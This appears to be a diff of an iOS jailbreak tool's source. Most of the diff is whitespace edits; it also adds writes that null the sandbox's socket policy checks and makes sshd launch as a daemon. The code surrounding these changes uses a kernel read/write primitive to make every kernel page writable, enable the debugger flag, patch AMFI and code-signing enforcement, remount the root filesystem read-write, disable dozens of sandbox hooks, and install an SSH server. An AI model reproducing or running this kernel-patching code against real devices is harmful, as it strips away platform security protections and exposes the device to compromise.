@@ -59,7 +59,7 @@ uint32_t kernelSize(void* kernel_base,uint32_t *lc_end){
         lc=(struct load_command*)(((char *)lc)+lc->cmdsize);
     }
     *lc_end=(uint32_t)lc;
-
+    
     return endOfLastSegment-firstSegment;
 }
 
@@ -97,7 +97,7 @@ void patch_kernel_pmap(uint32_t kernel_base, vm_address_t kdata, uint32_t ksize)
     printf("kernel pmap store @ 0x%08x\n", kernel_pmap_store);
     printf("kernel pmap tte is at VA 0x%08x PA 0x%08x\n", tte_virt, tte_phys);
     
-    /* every page is writable */    
+    /* every page is writable */
     uint32_t i;
     for (i=0; i<TTB_SIZE; i++) {
         uint32_t addr = tte_virt+(i<<2);
@@ -128,7 +128,7 @@ void patch_kernel_pmap(uint32_t kernel_base, vm_address_t kdata, uint32_t ksize)
             write_primitive(addr, new_entry);
         }
     }
-
+    
     printf("Every page is actually writable\n");
     sleep(3);
 }
@@ -158,7 +158,7 @@ int jailbreak(){
     uint32_t lc_len=0;
     uint32_t ksize=kernelSize(kdataPre,&lc_len);
     printf("Kernel size: 0x%08x\n",ksize);
-
+    
     vm_address_t kdata=(vm_address_t)malloc(ksize);
     
     for (int i=0; (i<<12)<ksize; i++) {
@@ -174,16 +174,16 @@ int jailbreak(){
     vm_write(iPhoneHACKED, kernel_base, (vm_offset_t)&write_test, sizeof(write_test));
     write_test = 0xfeedface;
     vm_write(iPhoneHACKED, kernel_base, (vm_offset_t)&write_test, sizeof(write_test));
-
+    
     /* test kernel pmap patch */
     write_primitive(kernel_base, 0x41424142);
     assure(read_primitive(kernel_base) == 0x41424142);
     write_primitive(kernel_base, 0xfeedface);
     assure(read_primitive(kernel_base) == 0xfeedface);
     printf("pmap patch success!\n");
-
+    
     betterWorkingAndShit(iPhoneHACKED,kernel_base,kdata,ksize);
-
+    
     pmap_unpatch();
     
     
@@ -199,18 +199,18 @@ void betterWorkingAndShit(mach_port_t taskHacked,uint32_t kernel_base, vm_addres
     uint32_t lc_len=0;
     kernelSize((void*)kdata,&lc_len);
     printf("Kernel size: 0x%08x\n",ksize);
-
+    
     //patch i can has debugger: get first dword in i_can_has_debugger (should be 0 0 0 0) and set it to 1
     uint32_t i_can_has_debugger_dst;
     find_i_can_has_debugger_patch_off(kernel_base, kdata, ksize, &i_can_has_debugger_dst);
     printf("I can has debugger dst: 0x%08x\n",i_can_has_debugger_dst);
     write_primitive(i_can_has_debugger_dst, 0x1);
-        
-
+    
+    
     postProgress(@"patching mount");
     uint32_t remount_patch_dst = find_remount_patch_offset(kernel_base, (uint8_t*)kdata, ksize) + kernel_base;
     printf("Found remount off: 0x%08x\n",remount_patch_dst);
-
+    
     uint32_t toPatch=read_primitive(remount_patch_dst);
     printf("Original value 0x%08x\n",toPatch);
     toPatch &=0xFFFF00FF;
@@ -232,9 +232,9 @@ void betterWorkingAndShit(mach_port_t taskHacked,uint32_t kernel_base, vm_addres
         rnosuid &=0xFF00FFFF;
         write_primitive(nosuid2, rnosuid);
     }
-
     
-        
+    
+    
     // Remount filesystem as readwrite
     postProgress(@"remounting filesystem");
     char* nm = strdup("/dev/disk0s1s1");
@@ -256,7 +256,7 @@ void betterWorkingAndShit(mach_port_t taskHacked,uint32_t kernel_base, vm_addres
     find_amfi_patch_offsets(kernel_base, kdata, ksize, &amfi_dst, &amfi_tgt);
     printf("What we hacked: 0x%08x 0x%08x\n",amfi_dst,amfi_tgt);
     write_primitive(amfi_dst, amfi_tgt+1);
-
+    
     // patch amfi.
     uint32_t cs_enforcement_disable_amfi = find_cs_enforcement_disable_amfi(kernel_base, kdata, ksize);
     printf("cs_enforcement_disable_amfi at=0x%08x\n",cs_enforcement_disable_amfi);
@@ -299,9 +299,9 @@ void betterWorkingAndShit(mach_port_t taskHacked,uint32_t kernel_base, vm_addres
     postProgress(@"patching sandbox");
     uint32_t sbops=0;
     find_sbops(kernel_base, (void*)kdata, ksize, &sbops);
-
+    
     printf("Found sbops 0x%08x\n",sbops);
-
+    
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
@@ -332,10 +332,26 @@ void betterWorkingAndShit(mach_port_t taskHacked,uint32_t kernel_base, vm_addres
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
-
+    
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
     write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
-
+    
+    
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_accept), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_accepted), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_bind), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_connect), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_create), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_label_update), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_listen), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_receive), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_received), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_select), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_send), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_stat), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_setsockopt), 0);
+    write_primitive(sbops+offsetof(struct mac_policy_ops, mpo_socket_check_getsockopt), 0);
+    
     
     if (open("/v0rtex", O_CREAT | O_RDWR, 0644)>=0){
         printf("write test success!\n");
@@ -351,11 +367,11 @@ int easyPosixSpawn(NSURL *launchPath,NSArray *arguments){
     static int (*dposix_spawn_file_actions_init)(posix_spawn_file_actions_t *) = NULL;
     static int (*dposix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const __argv[], char *const __envp[]) = NULL;
     static int (*dposix_spawn_file_actions_destroy)(posix_spawn_file_actions_t *) = NULL;
-
+    
     dposix_spawn_file_actions_init = dlsym(RTLD_DEFAULT, "posix_spawn_file_actions_init");
     dposix_spawn = dlsym(RTLD_DEFAULT, "posix_spawn");
     dposix_spawn_file_actions_destroy = dlsym(RTLD_DEFAULT, "posix_spawn_file_actions_destroy");
-
+    
     
     
     NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
@@ -373,17 +389,17 @@ int easyPosixSpawn(NSURL *launchPath,NSArray *arguments){
     
     posix_spawn_file_actions_t action = NULL;
     dposix_spawn_file_actions_init(&action);
-
+    
     pid_t pid;
     int status = 0;
     status = dposix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);
-
+    
     if (status == 0) {
         if (waitpid(pid, &status, 0) != -1) {
             // wait
         }
     }
-
+    
     dposix_spawn_file_actions_destroy(&action);
     
     return status;
@@ -396,7 +412,7 @@ int mysystem(char *cmd){
 void runLaunchDaemons(void){
     
     int r = 0;
-
+    
     if (![[NSFileManager defaultManager]fileExistsAtPath:@"/bin/tar"]){
         postProgress(@"installing files");
         NSLog(@"We will try copying %s to %s\n", [[NSBundle mainBundle]URLForResource:@"tar" withExtension:@""].path.UTF8String, [NSURL fileURLWithPath:@"/bin/tar"].path.UTF8String);
@@ -406,7 +422,7 @@ void runLaunchDaemons(void){
             return;
         }
     }
-
+    
     if(![[NSFileManager defaultManager] fileExistsAtPath:@"/Library/LaunchDaemons"]){
         postProgress(@"installing files");
         r = mkdir("/Library/LaunchDaemons", 0755);
@@ -433,7 +449,7 @@ void runLaunchDaemons(void){
         
         if(r != 0){
             NSLog(@"posix_spawn returned nonzero value: %d, errno: %d, strerror: %s\n", r, errno, strerror(errno));
-//            return;
+            //            return;
         }
         
         //ssh stuff
@@ -449,23 +465,18 @@ void runLaunchDaemons(void){
     if (![[NSFileManager defaultManager] fileExistsAtPath:@"/etc/ssh_host_rsa_key"]){
         mysystem("/usr/bin/ssh-keygen -N '' -t rsa -f /etc/ssh_host_rsa_key");
     }
-
+    
     if (![[NSFileManager defaultManager] fileExistsAtPath:@"/etc/ssh_host_ecdsa_key"]){
         mysystem("/usr/bin/ssh-keygen -N '' -t ecdsa -f /etc/ssh_host_ecdsa_key");
     }
-
+    
     if (![[NSFileManager defaultManager] fileExistsAtPath:@"/etc/ssh_host_ed25519_key"]){
         mysystem("/usr/bin/ssh-keygen -N '' -t ed25519 -f /etc/ssh_host_ed25519_key");
     }
-
-//    ssh doesn't work!
-    mysystem("/usr/sbin/sshd -d");
+    
+    mysystem("/usr/sbin/sshd");
     
     mysystem("echo 'really jailbroken'");
-    
-    /*
-     SET A BREAKPOINT HERE TO USE mysystem();
-    */
     
     NSLog(@"done\n");
     postProgress(@"done");
